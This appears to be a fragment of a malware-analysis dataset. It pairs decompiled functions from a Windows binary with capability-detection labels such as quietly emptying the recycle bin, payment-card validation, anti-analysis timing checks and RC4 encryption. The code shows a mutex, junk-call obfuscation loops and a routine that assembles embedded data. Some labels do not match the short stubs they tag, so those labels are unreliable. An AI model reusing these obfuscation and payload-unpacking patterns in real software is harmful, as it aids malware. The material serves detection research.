        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0040321f(uint noname_0, char *arg_ch)\n\n{\n    char cVar1;\n    uint var_14h;\n    uint var_dh;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = *arg_ch;\n    while( true ) {\n        if (cVar1 != -1) {\n            var_dh._0_1_ = false;\n            if ((cVar1 == -0x48) && (var_dh._0_1_ = false,  arg_ch[3] == 'P')) {\n                var_dh._0_1_ = arg_ch[4] == -0x33;\n            }\n            return var_dh._0_1_;\n        }\n        if (arg_ch[1] != '%') break;\n        arg_ch = **(arg_ch + 2);\n        cVar1 = *arg_ch;\n    }\n    return false;\n}\n",
        "token_count": 233
    },
    "004013d1": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004013d1(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_1eh;\n    uint var_14h;\n    uint32_t var_10h;\n    \n    var_10h = 0x3cf1db97;\n    (*_sym.imp.KERNEL32.dll_CreateMutexExA)(0, \"DSFHEDGH 4589\", 0, 0);\n    var_64h = 0;\n    do {\n        iVar5 = var_10h + 0xc30e2a2b;\n        iVar1 = 0x3cf1e612 - var_10h;\n        (*_sym.imp.ADVAPI32.dll_CryptHashSessionKey)(0x1bfb4e, 0x3d69c850 - var_10h, 0xf43);\n        (*_sym.imp.GDI32.dll_EndPage)(0xaaa536);\n        (*_sym.imp.KERNEL32.dll_GetCPInfo)(0xd86, &var_34h);\n        uVar3 = var_10h ^ 0x3cf1d041;\n        iVar2 = var_10h + 0xc30e2bf3;\n        var_1eh._0_2_ = 0x12;\n        uVar4 = var_10h ^ 0x3cf1d744;\n        (*_sym.imp.OLEAUT32.dll_VarBoolFromUI8)(0xa02513, 0, &var_1eh);\n        (*_sym.imp.USER32.dll_GetClipboardData)(0xcdc);\n        (*_sym.imp.GDI32.dll_Chord)(0x6a957c, uVar4, uVar4, 0x831, iVar1, uVar4, 0x61f, 0xe5d, 0x212);\n        (*_sym.imp.GDI32.dll_SetBrushOrgEx)(0xbb1fc, 0x3cf1eb52 - var_10h, 0x3cf1eb52 - var_10h, &var_3ch);\n        (*_sym.imp.GDI32.dll_DeleteObject)(0x5af528);\n        (*_sym.imp.GDI32.dll_Rectangle)(0x593c80, 0xf91, 0xf91, iVar2, iVar5);\n        (*_sym.imp.KERNEL32.dll_GetCurrentConsoleFont)(0x996add, uVar3, &var_1eh + 2);\n        var_14h = 0x838;\n        var_40h = 0x9ce;\n        (*_sym.imp.KERNEL32.dll_GetUserPreferredUILanguages)(0x10e, &var_14h, L\"#$^TGR#$%\", &var_40h);\n        var_64h = var_64h + 1;\n    } while (var_64h != 7);\n    return;\n}\n",
        "token_count": 870
    },
    "004030d2": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004030d2(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_18h = 0;\n    var_1ch = 0;\n    do {\n        iVar4 = var_18h * 0x1c;\n        iVar5 = var_18h * 0x1c;\n        var_18h = var_18h + 1;\n        var_1ch = (*(iVar4 + 0x417800) ^ *(iVar5 + 0x4177ec)) + var_1ch;\n    } while (var_18h != 7);\n    iVar4 = fcn.0040115d(4, var_1ch);\n    var_28h = 0;\n    var_24h = 0;\n    do {\n        iVar5 = *(var_28h * 0x1c + 0x4177e8);\n        uVar1 = *(var_28h * 0x1c + 0x4177ec);\n        uVar2 = *(var_28h * 0x1c + 0x417800);\n        uVar3 = uVar1 ^ uVar2;\n        var_44h = 0;\n        if (uVar2 != uVar1) {\n            do {\n                *(iVar4 + var_24h + var_44h) = *(iVar5 + var_44h);\n                var_44h = var_44h + 1;\n            } while (var_44h != uVar3);\n        }\n        var_28h = var_28h + 1;\n        var_24h = uVar3 + var_24h;\n    } while (var_28h != 7);\n    fcn.004024a1(iVar4, iVar4, var_1ch);\n    fcn.004012fa(arg_8h, iVar4);\n    return 0;\n}\n",
        "token_count": 560
    },
    "00401666": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.00401666(void)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    \n    var_8h = 0x75036802;\n    (*_sym.imp.KERNEL32.dll_GetStdHandle)(0x527);\n    var_38h = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_GetSystemTime)(&var_28h);\n        (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        var_38h = var_38h + 1;\n        (*_sym.imp.KERNEL32.dll_GetSystemDefaultUILanguage)();\n        (*_sym.imp.USER32.dll_GetClipCursor)(&var_18h);\n        (*_sym.imp.ole32.dll_CoGetCurrentProcess)();\n    } while (var_38h != 6);\n    return;\n}\n",
        "token_count": 249
    },
    "00401111": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401111(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00402411(&var_20h, 0x404179, 0xe);\n    arg_8h = fcn.004028b7();\n    *0x4178c4 = fcn.00402f61(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 108
    },
    "004012fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012fa(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    arg_8h[3] = 0x4a60;\n    arg_8h[1] = *0x4178cc;\n    arg_8h[2] = arg_ch + 0x369;\n    *arg_8h = arg_ch + 0x4de0;\n    return;\n}\n",
        "token_count": 96
    },
    "00401327": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401327(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00402411(&var_20h, 0x404206, 0x10);\n    arg_8h = fcn.004028b7();\n    fcn.00402f61(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 101
    },
    "0040136e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040136e(void)\n\n{\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_GlobalFree)(0x5ae375);\n    var_4h = 0xbed;\n    (*_sym.imp.USER32.dll_GetScrollRange)(0x5f6fdc, 0x751, &var_4h, &var_4h);\n    (*_sym.imp.USER32.dll_TrackPopupMenuEx)(0x79a679, 0x5a3, 0x3bf, 0x3bf, 0xd293aa, &var_18h);\n    return;\n}\n",
        "token_count": 167
    },
    "00401767": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401767(void)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = (*_sym.imp.USER32.dll_IsClipboardFormatAvailable)(0x9d7);\n    (*_sym.imp.USER32.dll_GetShellWindow)();\n    return uVar1;\n}\n",
        "token_count": 74
    },
    "00402645": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402645(void)\n\n{\n    uint arg_8h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.00402411(&var_20h, 0x4041f6, 0x10);\n    arg_8h = fcn.004028b7();\n    fcn.00402f61(arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 103
    },
    "004026a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004026a6(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_10h = -1;\n    if ((iVar1 != 0) && (var_10h = iVar1,  iVar1 == 1)) {\n        var_10h = 0;\n    }\n    return var_10h;\n}\n",
        "token_count": 134
    },
    "00402723": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402723(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.004028b7();\n    fcn.00402f61(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 74
    },
    "00402741": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402741(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + var_1ch) = *(arg_ch + var_1ch);\n            var_1ch = var_1ch + 1;\n        } while (var_1ch != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 155
    },
    "004029b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004029b4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 'P') {\n        iVar1 = 0;\n        if (*(iVar2 + 1) == 'E') {\n            iVar1 = iVar2;\n        }\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 133
    },
    "00402c11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ah\n\nint16_t __cdecl fcn.00402c11(uint arg_8h)\n\n{\n    uint var_ah;\n    \n    if (arg_8h - 0x61U < 0x1a) {\n        arg_8h._0_2_ = arg_8h + -0x20;\n    }\n    return arg_8h;\n}\n",
        "token_count": 94
    },
    "0040307d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040307d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 142
    }
}